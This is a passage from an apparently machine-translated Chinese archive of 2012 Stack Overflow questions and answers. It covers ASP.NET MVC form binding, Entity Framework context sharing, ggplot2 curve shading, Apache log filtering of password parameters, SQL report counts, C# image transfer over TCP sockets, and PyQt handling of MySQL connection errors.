    <label for="password">password:</label>
    <%= Html.TextBox("password") %>
    </fieldset>
    <input type="submit" value="Add User" name="submitUser" />
<% } %> 
```

路由：

```
routes.MapRoute(
    "Admin",
    "Admin/{id}",
    new { controller = "Administration", action = "Admin"}
); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:02:16.557

你可以用 asp.net mvc 的方式来做，并将你的视图强输入到模型中

模型：

```
 public class ViewModel
    {
      public string Username {get; set;}
      public string Password {get; set;}
    } 
```

强烈键入您的视图：

```
<%@ Page Title="" Language="C#" Inherits="System.Web.Mvc.ViewPage<ViewModel>" %>  //the ViewModel will need to have it's fully qualified name here 
```

然后使用 mvc 的默认模型绑定：

```
<% using (Html.BeginForm()){ %>

    <%= Html.LabelFor(m => m.Username) %>
    <%= Html.TextBoxFor(m => m.Username) %>

    <%= Html.Label(m => m.Password) %>
    <%= Html.TextBoxFor(m => m.Password) %>

    <input type="submit" value="Add User" name="submitUser" />
<% } %> 
```

控制器：

```
[HttpPost]
public ActionResult Admin(ViewModel model) 
{
    var username = model.Username;
    var password = model.Password;
    Helper.CreateUser(username,password);
    return View("AdministerUsers");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T17:33:06.620

FormCollection 没有对应于用户名或密码的属性；MVC 绑定使用反射查看对象以确定发布的数据绑定到的位置。

因此，在您的情况下，切换到此签名应该可以解决您的问题：

```
 public ActionResult Admin(uint id, string username, string password)
 {
      // .. Do your stuff
 } 
```

由于参数包含“用户名”和“密码”，它们与您发布的表单元素的名称相匹配，因此它们包含的数据将绑定到这些变量。

# screenshot - 应用商店屏幕截图大小 - iPhone 5

> ID：12429300
> 
> 赞同：2
> 
> 时间：2012-09-14T17:30:33.470
> 
> 标签：screenshot, iphone-5

在应用商店中显示的应用屏幕截图是否为 iPhone 5 或更小尺寸？

# mysql - 从wordpress将数据插入mysql表

> ID：12429304
> 
> 赞同：0
> 
> 时间：2012-09-14T17:30:55.640
> 
> 标签：mysql, wordpress, insert

```
 ... $tablename = $output2; 
      if($a==-1){   
       $query = "CREATE TABLE `" . $tablename . "` (
       `id` mediumint(9) NOT NULL AUTO_INCREMENT,
       `Name` varchar(60) NOT NULL,
       `Number` varchar(12) NOT NULL,
        PRIMARY KEY  (`id`)
        );"; 
       require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
       dbDelta($query);
       }
       else{
       $wpdb->insert(
        $tablename, 
        array( 
            'Name' => $output, 
            'Number' => $output2,
             ), 
        array( 
            '%s',
            '%s',
                ) 
        );

       } 
```

$output 和 $output2 正在初始化。正在创建一个名为 $output2 的表，但当“a”包含任何非负值时，不会插入这些值。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:43:52.280

如果`a`是一个变量而不是定义的常量，那么您的代码中有错误。那么它应该是：

```
if($a==-1){ 
```

# javascript - 如何在 asp.net 文档的末尾而不是在 ScriptManager 中注册 js 文件

> ID：12429310
> 
> 赞同：3
> 
> 时间：2012-09-14T17:31:56.643
> 
> 标签：javascript, asp.net

在某些圈子中，最佳实践建议在文档末尾注册 JavaScript 文件 (js)，以允许 DOM 在调用 js 之前完全加载。这完全有道理，但我的问题是，如果您使用的是 asp.net 网络表单，并且由于回发，我需要使用 scriptmanager 注册 js 文件

```
<asp:ScriptManager ID="ScriptManager1" runat="server">
        <Scripts>
            <asp:ScriptReference Path="~/js/jquery-1.7.js" />
            <asp:ScriptReference Path="~/js/jquery.simplemodal-1.4.2.js" />
</Scripts>
</asp:ScriptManager> 
```

由于脚本管理器必须位于文档顶部，然后才能调用任何 ajax 功能，因此我似乎无法在文档开头注册 .js 文件。这是正确的吗？是否有其他替代方法可以在页面底部注册文件以帮助提高页面性能（除了缩小脚本。上面的示例只是一个示例，而不是生产代码）。将 js 文件移出脚本管理器会导致页面在初始回发后失去对 js 文件的引用。

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T20:12:31.323

我不太熟悉脚本管理器类以及为什么需要使用它，但脚本管理器上有一个名为[loadscriptsbeforeui](http://msdn.microsoft.com/en-us/library/system.web.ui.scriptmanager.loadscriptsbeforeui.aspx)的属性，默认设置为 true。此外，就最佳实践而言，这些可能应该从 CDN 中提取，在那里它们更有可能被缓存，并且在 UI 之前加载时风险不如自定义 js 文件高。

综上所述，我不知道为什么你不能放弃脚本管理器并在底部使用标记自己加载它们。只要之后加载/运行ajax代码。

也许我错过了你的一些限制？

# javascript - 为什么这些立体主义的地平线图向左挤压？

> ID：12429311
> 
> 赞同：3
> 
> 时间：2012-09-14T17:32:24.027
> 
> 标签：javascript, d3.js, cubism.js

我正在从 Graphite 加载指标，但是当它们在水平图表上呈现时，它们会在图表的左侧被挤压，而不是占据图表空间的整个宽度。这是一个屏幕截图，显示我的意思：

![在此处输入图像描述](../Images/70c59652ab8e2f8584e36126e3641a33.png)

该数据来自我要求的 3 小时窗口。以下是最顶层水平图表的一些石墨输出：

```
,1347632400,1347643200,60|892.0,526.0,371.0,1475.0,1234.0 [...] 1250.0,1604.0,1146.0,965.0 
```

从图像中很难分辨，但这些值确实与绘制的内容一致。只是他们没有占用所有空间。

该图表被绘制成一个简单的`<div id="#graphs">`，它只有`position: relative`和`width: 1080px;`用于 CSS 属性。这是立体主义 JavaScript：

```
var context = cubism.context()
    .step(1e4)
    .size(1080);  // 3 hours

var graphite = context.graphite("http://graphite.example.com");
var horizon = context.horizon().metric(graphite.metric).height(100);

var metrics = [
    "prod.counts.total_stats",
    "stage.counts.total_stats",
    "dev.counts.total_stats"
]

d3.select("#graphs").append("div")
    .attr("class", "axis")
    .call(context.axis().ticks(12).orient("top"));

d3.select("#graphs").append("div")
    .attr("class", "rule")
    .call(context.rule());

d3.select("#graphs").selectAll(".horizon")
    .data(metrics)
  .enter().append("div")
    .attr("class", "horizon")
    .call(horizon); 
```

CSS 的其余部分几乎是从[股票演示](http://bost.ocks.org/mike/cubism/intro/demo-stocks.html)中复制粘贴的。为简洁起见，我不会包括在内，但如果有必要，我可以。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T19:27:42.963

见[第 20 期](https://github.com/square/cubism/issues/20)：

> 目前，当 Cubism 请求 10 秒指标时，Graphite 将返回其最低分辨率的数据；但是，可用的最低分辨率实际上可能是更高的分辨率（例如 1 分钟数据）。立体主义，不知道更好，不准确地显示这些数据，而不是对数据进行上采样。

您可以通过在 Graphite 中存储更高分辨率的数据，或者说 summarise(metric, "10s") 来解决这个问题。

# c# - 实体框架：代码优先。共享和实例上下文

> ID：12429312
> 
> 赞同：2
> 
> 时间：2012-09-14T17:32:45.157
> 
> 标签：c#, entity-framework, ef-code-first

我正在使用实体框架代码优先方法和 mvc4 Web 应用程序构建一个分层应用程序，主要以`Data`、`Services`和`Web`.

在我的网站上，我这样做：

```
public void Foo() {
    EntityService _svc = new EntityService();
    Entity = _svc.FindById(1);
} 
```

服务方法如下所示：

```
private readonly MyContext _ctx = new MyContext();

public Entity FindById(long id) {
    return _ctx.Entities.SingleOrDefault(q => q.EntityId == id);
} 
```

**问题是当我需要使用多个服务时，因为每个服务都会创建自己的上下文。**

试图解决这个问题我做了这样的事情：

```
public class MyContext : DbContext {
    private static MyContext _ctx;

    public MyContext() : base("name=myConnectionString") { }

    public static MyContext GetSharedInstance() {
        return GetSharedInstance(false);
    }

    public static MyContext GetSharedInstance(bool renew) {
        if(_ctx == null || renew)
            _ctx = new MyContext();

        return _ctx;
    }
} 
```

将我的服务更改如下：

```
public class EntityService
{
    private readonly MyContext _ctx;

    public bool SharedContext { get; private set; }

    public EntityService()
        : this(false) { }

    public EntityService(bool sharedContext)
        : this(sharedContext, false) { }

    public EntityService(bool sharedContext, bool renew)
    {
        SharedContext = sharedContext;

        if (SharedContext)
            _ctx = MyContext.GetInstance(renew);
        else
            _ctx = new MyContext();
    }
} 
```

现在，如果我想分享我的上下文的一个实例，我会做这样的事情：

```
EntityService _entitySvc = new EntityService(true, true);
AnotherEntityService _anotherEntitySvc = new AnotherEntityService(true); 
```

这至少是克服这个问题的好方法吗？我将不胜感激提供的任何帮助。谢谢。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-14T17:48:39.507

永远永远永远永远永远永远...永远...我有没有提到过？我是认真的。永远不要创建静态数据上下文。永远不能。真的。我可以再强调一点吗？绝不。甚至不要考虑它。想想它会让你患上脑癌。

这是依赖注入真正大放异彩的情况之一。使用依赖注入，您可以管理数据上下文的生命周期，并使它们在请求的生命周期内有效，而不是像静态一样在应用程序池的生命周期内有效。

详细说明为什么共享上下文不好。不仅在您的类之间共享上下文，而且在线程和请求之间共享。这意味着同时使用该站点的两个用户将相互踩踏彼此的数据上下文，从而导致各种问题。数据上下文不是线程安全的，也不是并发安全的。

如果要与多个对象共享数据上下文，则需要将其作为方法调用的一部分或作为构造函数参数传递给这些对象。

但是，我强烈建议通过依赖注入来执行此操作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-28T19:00:30.143

我偶然发现了这个寻找别的东西，我最近为实体框架构建了一个存储库模式。它旨在封装框架，同时让自己的存储库模式大放异彩。你会想要听从神秘人的建议。这是我建议您如何处理它的粗略示例。

```
public class MyContext: DbContext, IUnitOfWork
{
    public IDbSet<Note> Notes { get; set; }
    public IDbSet<DomainType> DomainTypes { get; set; }
    public IDbSet<DomainValue> DomainValues { get; set; }
    public IDbSet<Party> Parties { get; set; }

    public MyContext() :base()
    {
        Configuration.LazyLoadingEnabled = false;
        Configuration.ProxyCreationEnabled = false;
    }
} 
```

如您所见，DbContext 是一个 IUnitOfWork，其上仅包含 SaveChanges 方法。这就是您要传递到存储库中的内容。

```
public abstract class BaseEfRepository<T, TU> : IRepository<T>
    where T : class 
    where TU : IUnitOfWork
{
    ...
    virtual public T GetSingle(Expression<Func<T, bool>> whereCondition)
    {
        Log.DebugFormat("Called GetSingle<{0}>()...", typeof(T));
        return MyEntitySet.Where(whereCondition).FirstOrDefault();
    } [etc...]

} 
```

这将包含您的大部分基本存储库样式的集合访问器以及您想要封装的任何内容。UnitOfWork 被传递到存储库中，因此您可以在同一事务中拥有任意数量的存储库。

```
public class NoteRepository: BaseEfRepository<Note, MyContext>
{
    public NoteRepository(MyContext uow) : base(uow)
    {
        MyEntitySet = uow.Notes;
    }
    public Note GetSingleWithParties(Expression<Func<Note, bool>> whereCondition)
    {
        return [... whatever ...]
    }

} 
```

我希望这被证明是有用的。

# windows-phone-7 - adcontrol 在瞬间消失 - WP7

> ID：12429319
> 
> 赞同：1
> 
> 时间：2012-09-14T17:33:25.763
> 
> 标签：windows-phone-7, controls, ads

我已经为此苦苦挣扎了好几个星期，但不知道为什么它不起作用。我正在测试我的第一个应用程序 WP7 应用程序，并希望通过广告横幅为其提供资金。但我所看到的只是一个黑色方块，只有几分之一秒，因为它变得不可见。该应用程序的测试版可以在这里下载：http: [//www.windowsphone.com/de-de/store/app/flyingfatty/196a2541-5989-48cd-8d0f-eacf988b47d7](http://www.windowsphone.com/de-de/store/app/flyingfatty/196a2541-5989-48cd-8d0f-eacf988b47d7)

为了包含横幅，我采取了以下步骤：

1.  下载 Windows Phone 广告 SDK (WPAdSDK-DEU.msi)
2.  将 Microsoft.Advertising.Mobile 和 Microsoft.Advertising.Mobile.UI Reference 添加到我的项目中。
3.  添加： xmlns:my="clr-namespace:Microsoft.Advertising.Mobile.UI;assembly=Microsoft.Advertising.Mobile.UI" 到我的 xaml
4.  将 80x480 AdControl 元素添加到我的 xaml
5.  创建一个 pub center 帐户并注册我的应用程序和 adcontrol。作为我选择运动、旅游和购物的类别，这些类别中的广告最多
6.  将应用程序 ID 和 adunit-ID 粘贴到我的 xaml 中，如下所示

`<my:AdControl AdUnitId="93769"`
`ApplicationId="32b430d7-aa81-440d-99a1-62c65e75f64a"`
`IsAutoRefreshEnabled="True"`
`Height="80"`
`HorizontalAlignment="Left"`
`Margin="0"`
`Name="adControlReal"`
`VerticalAlignment="Bottom"`
`Width="480" />`

如上所述，我在消失之前看到一个黑色横幅。我还尝试了 AdUnitId="Image480_800" 和 ApplicationId="test_client" 用于测试目的，但效果相同。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T21:31:46.137

尝试订阅错误事件以了解发生这种情况的原因。

[AdControl.ErroOccurrred 事件](http://msdn.microsoft.com/en-us/library/advertising-mobile-windows-phone-adcontrol-silverlight-erroroccurred-event%28v=msads.20%29)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:54:32.097

我也经历过，我的理论是当应用程序有大量下载时，广告会经常显示，越流行的广告和印刷品就会越多，如果它是一个新应用程序，那么它会显示很少，我这么说是因为我的应用程序有 240 多次下载，并且打印了 250 多次，我为此赢得了 0.50 美元 :) 所以看起来如果你看到广场一切都很好

# php - php通过下标比较字符串

> ID：12429332
> 
> 赞同：0
> 
> 时间：2012-09-14T17:34:32.930
> 
> 标签：php, html

您好，我在 PHP 中有以下脚本：

```
$correct = array("a", "a", "a", "a");
$totalValue = "First Name: " . $fname . "\n";
$totalValue .= "About Our Mission | Question 01: " . $S1Q1 . "&nbsp;&nbsp;&nbsp;&nbsp;" . (compare $correct[0] with $S1Q1 choice) ? "Correct" : "Wrong" . "\n"; 
```

$S1Q1 是我使用单选按钮从表单中接受的变量：

```
 <input type="radio" name="S1Q1" value="a" /> True
    <input type="radio" name="S1Q1" value="b" /> False 
```

**（比较 $correct[0] 和 $S1Q1 选项）？“正确”：“错误”** <我如何在 php 代码中实现它。

对于下一个电台选择，我会比较**$correct[1] 和 $S1Q2** ...等等。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:37:44.317

这将检查单选按钮中输入的值是否 = 正确答案

```
$S1Q1 = $_GET['S1Q1'];
($S1Q1 == $correct[0]) ? 'correct' : 'wrong' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T17:36:58.680

主要机制：

```
$S1Q1 = $_GET['S1Q1']; // or $_POST['S1Q1']
($correct[0] == $S1Q1 ) ? 'Correct' : 'Wrong' 
```

使用循环：

```
if( isset($_POST) && !empty($_POST) ){
   foreach($_POST as $key => $val ) {
       $index = (int) str_replace('S1Q', '', $key ); // 1, 2, 3..
       $result = $val == $correct[ $index - 1 ] ? 'Correct' : 'Wrong';
   }
} 
```

`$result`在您的代码中使用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T17:38:33.707

您可以使用 $_POST 和/或 $_GET 访问 var

```
 $S1Q1 = $_POST['S1Q1'] 
```

# r - 如何使用ggplot2对曲线下的区域进行着色

> ID：12429333
> 
> 赞同：25
> 
> 时间：2012-09-14T17:34:33.997
> 
> 标签：r, graphics, statistics, ggplot2

我一直在尝试使用 ggplot2 生成类似于此 R 图形的图：

```
xv<-seq(0,4,0.01)
yv<-dnorm(xv,2,0.5) 
plot(xv,yv,type="l") 
polygon(c(xv[xv<=1.5],1.5),c(yv[xv<=1.5],yv[xv==0]),col="grey") 
```

这是我对ggplot2的了解：

```
x<-seq(0.0,0.1699,0.0001)   
ytop<-dnorm(0.12,0.08,0.02)
MyDF<-data.frame(x=x,y=dnorm(x,0.08,0.02))
p<-qplot(x=MyDF$x,y=MyDF$y,geom="line") 
p+geom_segment(aes(x=0.12,y=0,xend=0.12,yend=ytop)) 
```

我想遮蔽 x=0.12 以外的尾部区域。我将如何使用 ggplot 或 qplot 执行此操作？

从广义上讲，如何遮蔽曲线下的任何子集，无论是尾部，还是将区域划分为不同区域的两条任意线之间？

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-09-14T17:50:00.747

使用要着色的区域创建一个多边形

```
#First subst the data and add the coordinates to make it shade to y = 0
shade <- rbind(c(0.12,0), subset(MyDF, x > 0.12), c(MyDF[nrow(MyDF), "X"], 0))

#Then use this new data.frame with geom_polygon
 p + geom_segment(aes(x=0.12,y=0,xend=0.12,yend=ytop)) +
     geom_polygon(data = shade, aes(x, y)) 
```

![在此处输入图像描述](../Images/07b957a0614f6319e74744a40a5402a0.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2020-06-18T13:00:13.173

这本质上是卢西亚诺答案的副本，我发现它很有用，但是它可能会为其他想要使用这种方法的人节省一些时间。

创建数据。这里是具有指定均值和 sd 的正态分布的第 0.1 个百分位到第 99.9 个百分位的 0.001 个间隔的密度。

```
mean_ = 10
sd_ = 4

x = seq(qnorm(c(0.001), mean_, sd_),qnorm(c(0.999), mean_, sd_),0.001) 

distdata = data.frame(x=x,y=dnorm(x,mean_,sd_)) 
```

用于根据特定值对左尾或右尾进行着色的函数。

```
shade_under_curve = function(p, d, left=NULL, right=NULL, distrib, fill, ...){

  if(!is.null(left)){

    shade = rbind(c(d[1, "x"], 0), d[d$x<left,], c(left,0))

  } else if(!is.null(right)){

    shade = rbind(c(right,0), d[d$x>right,], c(d[nrow(d), "x"], 0))

  }

  value = c(left, right)

  ytop<-distrib(value,...)

  p + geom_segment(aes(x=value,y=0,xend=value,yend=ytop)) +
    geom_polygon(data = shade, aes(x, y), alpha=0.2, fill=fill) 

} 
```

例子：

```
p = qplot(x=distdata$x,y=distdata$y,geom="line") 

shade_under_curve(p, distdata, left=3, distrib=dnorm, mean=mean_, sd=sd_, fill = "red") 

shade_under_curve(p, distdata, right=15, distrib=dnorm, mean=mean_, sd=sd_, fill = "blue")

p2 = shade_under_curve(p, distdata, left=qnorm(0.025, mean_, sd_), distrib=dnorm, mean=mean_, sd=sd_, fill = "green") 
shade_under_curve(p2, distdata, right=qnorm(0.975, mean_, sd_), distrib=dnorm, mean=mean_, sd=sd_, fill = "green") 
```

# java - 是否可以在 apache 访问日志中排除指定的 GET 参数？（通过 W7 开发环境）

> ID：12429337
> 
> 赞同：0
> 
> 时间：2012-09-14T17:34:46.460
> 
> 标签：java, apache

apache的日志中隐藏了一个安全漏洞，比如你输入了一个关于

```
http://localhost/meeting/import.php?cmd=admin&password=pass&userName=hsh&meetingID=123 
```

进入浏览器，然后**access.log**将完成记录，所以这是一个安全问题，因为它记录了安全参数：

```
cmd=admin&password=pass&userName=hsh&meetingID=123 
```

现在，我想控制我的日志打印，如果我执行一个不包含安全参数的 url，例如**http://localhost/meeting/op.do**，access.log 必须记录它，但是如果我输入一个包含安全性的 url参数如：

```
http://localhost/meeting/import.php?cmd=admin&password=pass&userName=hsh&meetingID=123 
```

那么access.log不应该记录它，我应该去实现什么？

我尝试了一种方法，该方法可以设置有关**SetEnvIf**和**CustomLog**的日志变量，但它不起作用：

```
SetEnvIf Request_URI "(https?://.+\\?([^=]+=[^=]+)+)" dontlog 
CustomLog logs/access.log common  env=!dontlog 
```

因为我的app请求类型是get，所以Request_URI无法获取参数，如果你执行一个URL：

```
http://localhost/meeting/import.php?cmd=admin&password=pass 
```

Request_URI 是**http://localhost/meeting/import.php**，所以这个方法不能成功。

您有什么有用的方法或建议吗？如果您解决此问题，我将不胜感激，谢谢。提醒一下，我的开发环境是W7，不是linux，不支持shell。

## ****** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ********

 **----**问题变了！！！**----

现在，我不仅要控制我的日志打印，而且如果我执行一个不包含安全参数的 url，它也会将参数替换为 *symbol，例如：

```
http://localhost/meeting/op.do, 
```

access.log 必须记录它，但是如果我输入一个包含安全参数的 url，例如

```
http://localhost/meeting/import.php?cmd=admin&password=pass&userName=hsh&meetingID=123, 
```

那么正则表达式替换必须起作用，它会解决：

```
http://localhost/meeting/import.php?cmd=****&password=****&userName=****&meetingID=****, 
```

进入日志，我应该去实现什么？提醒：我的开发环境是W7。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:44:09.510

`Request_URI`不包括 query_string 所以它永远不会匹配。您需要使用`mod_rewrite`来设置环境变量。

```
RewriteEngine On
RewriteCond %{QUERY_STRING} (password=)
RewriteRule ^ - [E=dontlog:1]
CustomLog logs/access.log common env=!dontlog 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T17:39:37.667

不只是更改您的应用程序以使用 POST 请求来处理任何需要密码的更简单的解决方案吗？这就是为什么您不应该对任何您不想记录的内容使用 GET 请求的原因。**

# mysql - 计算按一个字段分组的两个表中的记录

> ID：12429347
> 
> 赞同：2
> 
> 时间：2012-09-14T17:35:36.457
> 
> 标签：mysql, count, records

我有 2 张桌子：

1.  带有字段的医生报告：
    *   医生RepID
    *   代表名
    *   医生姓名
    *   添加日期
2.  有领域的医院：
    *   医院编号
    *   代表名
    *   医院名称
    *   医生姓名
    *   添加日期

我需要使用 DateAdded 计算医生报告和医院中每个 RepName 添加的记录。

我需要它看起来像这样：

```
RepName | DoctorReportsCount | HospitalsReportsCount | DateAdded
        |                    |                       |
  John  |          15        |          12           | 9/4/2012 
```

医生报告表中的 RepName 等于医院表中的 RepName。

@bluefeet 这部分是我需要的，但是如果 RepName 在此日期没有添加任何记录，那么我们可以将 DateAdded 字段统一为 DateAdded = 0。例如：

```
RepName | DoctorReportsCount | HospitalsReportsCount | DateAdded
        |                    |                       |
  John  |          15        |          12           | 9/4/2012
  Ann   |          9         |           0           | 9/2/2012
Tamer   |          0         |           12          | 9/1/2012 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:40:43.397

听起来你正在尝试这样做：

~~`select d.RepName, count(d.RepName) DoctorReportsCount, count(h.RepName) HospitalsReportsCount, d.DateAdded from doctorreports d inner join hospitals h on d.RepName = h.RepName group by d.RepName, d.DateAdded`~~

编辑：

~~`select * from ( select d.RepName, count(d.RepName) DoctorReportsCount , d.dateadded from doctorreports d group by d.RepName, d.dateadded ) d left join ( select h.RepName, count(h.RepName) HospitalsReportsCount , h.dateadded hDateadded from hospitals h group by h.RepName, h.dateadded )h on d.RepName = h.RepName`~~

# ~~`see [SQL Fiddle with demo](http://sqlfiddle.com/#!2/88e2e/4)`~~

编辑#2，如果您想返回丢失日期的数据，那么我建议创建一个包含日历日期的表，然后您可以返回丢失日期的数据。以下应返回您要查找的内容。请注意，我为此查询创建了一个日历表：

```
select COALESCE(d.drep, '') repname,
  COALESCE(d.DCount, 0) DoctorReportsCount,
  COALESCE(h.HCount, 0) HospitalsReportsCount,
  c.dt Dateadded
from calendar c
left join
(
  select repname drep,
    count(repname) DCount,
    dateadded ddate
  from doctorreports
  group by repname, dateadded
) d
  on c.dt = d.ddate
left join
(
  select repname hrep,
    count(repname) HCount,
    dateadded hdate
  from hospitals
  group by repname, dateadded
) h
  on c.dt = h.hdate
  and d.drep = h.hrep 
```

# 见[SQL Fiddle with Demo](http://sqlfiddle.com/#!2/91643/37)

如果您不关心其他日期，那么您可以在没有`date`表格的情况下这样做：

```
select COALESCE(d.RepName, '') repname,
  COALESCE(d.DoctorReportsCount, 0) DoctorReportsCount,
  COALESCE(h.HospitalsReportsCount, 0) HospitalsReportsCount,
  COALESCE(p.PharmacyReportsCount, 0) PharmacyReportsCount,
  d.dateadded Dateadded
from
(
  select d.RepName,
      count(d.RepName) DoctorReportsCount
    , d.dateadded
  from doctorreports d
  group by d.RepName, d.dateadded
) d
left join
(
  select h.RepName,
    count(h.RepName) HospitalsReportsCount
  , h.dateadded hDateadded
  from hospitals h
  group by h.RepName, h.dateadded
)h
  on d.RepName = h.RepName
  and d.dateadded = h.hDateadded
left join
(
  select p.RepName,
    count(p.RepName) PharmacyReportsCount
  , p.dateadded hDateadded
  from PharmacyReports p
  group by p.RepName, p.dateadded
)p
  on d.RepName = p.RepName
  and d.dateadded = p.hDateadded 
```

# 见[SQL Fiddle with Demo](http://sqlfiddle.com/#!2/91643/40)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-15T14:59:05.497

下面的 SQL 语句应该会带来你想要的结果：

```
SELECT 
    RepName,
    SUM(DoctorReports) AS DoctorReportsCount,
    SUM(HospitalReports) AS HospitalReportsCount,
    DateAdded
FROM (
    (SELECT RepName, COUNT(*) AS DoctorReports, 0 AS HospitalReports, DateAdded
     FROM doctorreports
     GROUP BY RepName, DateAdded)
    UNION
    (SELECT RepName, 0 AS DoctorReports, COUNT(*) AS HospitalReports, DateAdded
     FROM hospitals
     GROUP BY RepName, DateAdded)
) AS temp
GROUP BY
    RepName, DateAdded
ORDER BY
    RepName, DateAdded; 
```

# c# - 在 C# 中通过 TCP 套接字传输图像的问题

> ID：12429351
> 
> 赞同：2
> 
> 时间：2012-09-14T17:35:58.553
> 
> 标签：c#, image, sockets, tcp, bitmap

我要做的是将客户端屏幕的图像传输到服务器。为此，在客户端，我获取屏幕图像，将其转换为字节数组并通过 TCP 套接字将字节数组发送到服务器。在服务器端，我将客户端的字节数组转换为图像并将其放入图片框中。

好吧，结果在客户端看起来很酷，但是我在服务器端得到的图片是扭曲的： ![http://i.stack.imgur.com/wsLNh.png](../Images/835028461948bdcc96d056266f1e920c.png)

右图是客户端（保存画面并发送给服务器），左边是服务器端。正如您在服务器端看到的那样，图片未满。

我正在使用这些代码发送图像，接收图像并转换（字节>图像||图像>字节）：

```
private Image getScreen()
{
    Size s = Screen.PrimaryScreen.Bounds.Size;
    Bitmap b = new Bitmap(s.Height, s.Width);
    Graphics g = Graphics.FromImage(b);
    g.CopyFromScreen(0, 0, 0, 0, s);

    return b;
}

private byte[] BmpToBytes(Image bmp)
{
    MemoryStream ms = new MemoryStream();
    bmp.Save(ms, ImageFormat.Jpeg);
    byte[] bmpBytes = ms.GetBuffer();
    bmp.Dispose();
    ms.Close();

    return bmpBytes;
}

private Image BytesToImg(byte[] bmpBytes)
{
    MemoryStream ms = new MemoryStream(bmpBytes);
    Image img = Image.FromStream(ms);
    return img;
}

Client side:
private void SendScreenToServer()
{
    while (true)
    {
        byte[] sendBytes = new byte[12500];
        sendBytes = BmpToBytes(getScreen());
        pictureBox1.Image = getScreen();
        serverStream.Write(sendBytes, 0, sendBytes.Length);
        serverStream.Flush();
    }
}

Server side:
private void GetScreenFromClient()
{
    while (true)
    {
        byte[] bytesFrom = new byte[12500];
        networkStream.Read(bytesFrom, 0, clientSocket.ReceiveBufferSize);

        try
        {
            pictureBox1.Image = BytesToImg(bytesFrom);
        }
        catch { }
    }
} 
```

有人知道我在做什么错吗？还是有任何其他选项可以通过套接字传输图像？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:45:48.767

我会盲目猜测，因为您没有向我们展示您用于传输图像的代码。

`stream.Read(buffer,start,length)`不保证你会得到`length`字节，而不是溢出缓冲区是上限。您应该检查给出读取字节数的返回值。

编辑

检查`networkStream.Read(bytesFrom, 0, clientSocket.ReceiveBufferSize)`返回的内容。它可能小于12500。

您可能还需要在发送图像之前发送图像的大小，以便能够准确地知道要从流中读取多少字节。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T17:48:01.970

你忘了设计和实现一个协议。

```
 networkStream.Read(bytesFrom, 0, clientSocket.ReceiveBufferSize); 
```

这从 TCP 数据连接接收一堆字节。接下来你要做的就是根据你的协议处理这些字节。

接收者应该如何知道它何时收到了整个图像？您必须决定如何进行编码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-06T07:31:58.173

如果您每次通过网络传输整个图像而不是第一次发送整个图像并且从下一次您应该只将先前图像和当前图像之间的差异发送到服务器并且在服务器端您只是应用，那将是一个坏主意当前图像上的差异。您可以搜索谷歌以获得通过网络发送图像之间差异的良好逻辑，并将差异应用于服务器端的当前图像。谢谢

# python - 在 QMessageBox 中显示 MySQL 错误

> ID：12429353
> 
> 赞同：0
> 
> 时间：2012-09-14T17:36:02.163
> 
> 标签：python, mysql, error-handling, pyqt, qmessagebox

我正在运行一个本地 MySQL 服务器来开发我的 PyQt 应用程序。如果服务器关闭时我可以显示一个 QMessageBox 那就太好了，这样最终用户就会知道为什么应用程序没有启动。

如果我关闭服务器并从终端运行我的程序，我会得到通常的响应：

`pymysql.err.OperationalError: (2003, "Can't connect to MySQL server on '127.0.0.1' (2)")`

我的代码很简单

```
import pymysql as lite

con = lite.connect(host='127.0.0.1',unix_socket='/run/mysqld/mysqld.sock', user='ivica',passwd='pass',db='baza',charset='utf8')

#define one class that inherits QMainWindow and so on... 
```

有没有办法让我实际显示一个 QMessageBox 说明“MySQL 服务器已关闭！” 或类似的东西？如果 MySQL 服务器没有运行，我的应用程序窗口甚至不会显示，只是终端错误。

：编辑：

提出更改后，我的代码如下所示：

```
con = None #this is how I make it global, eg. not in any method or class (?)

def dbconnect():
    global con
    #con = None
    try:
        if os.name == 'nt':
            con = lite.connect(host='127.0.0.1', user='ivica',passwd='pass',db='baza',charset='utf8')
        else:
            con = lite.connect(host='127.0.0.1',unix_socket='/run/mysqld/mysqld.sock', user='ivica',passwd='pass',db='baza',charset='utf8')
    except lite.err.OperationalError as err:
        msgBox = QtGui.QMessageBox()
        msgBox.setText(str(err))
        msgBox.show()
    return con

class Logon(QtGui.QDialog):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.ui=Ui_dlgLogovanje()
        self.ui.setupUi(self)
        QtCore.QObject.connect(self.ui.dugmeUloguj, QtCore.SIGNAL("clicked()"), self.doLogin)

    def doLogin(self):          
        with dbconnect():
            cur = dbconnect().cursor() 
```

我得到的错误是：

```
Traceback (most recent call last):
  File "main.py", line 59, in doLogin
    with dbconnect():
AttributeError: __exit__ 
```

：编辑2：

在 unutbu 的回答和我对代码的一些摆弄之后，这就是我正在寻找的解决方案：

```
con = None

def dbconnect():
    global con
    try:
        if os.name == 'nt': 
            con = lite.connect(host='127.0.0.1', user='ivica',passwd='pass',db='baza',charset='utf8')
        else:
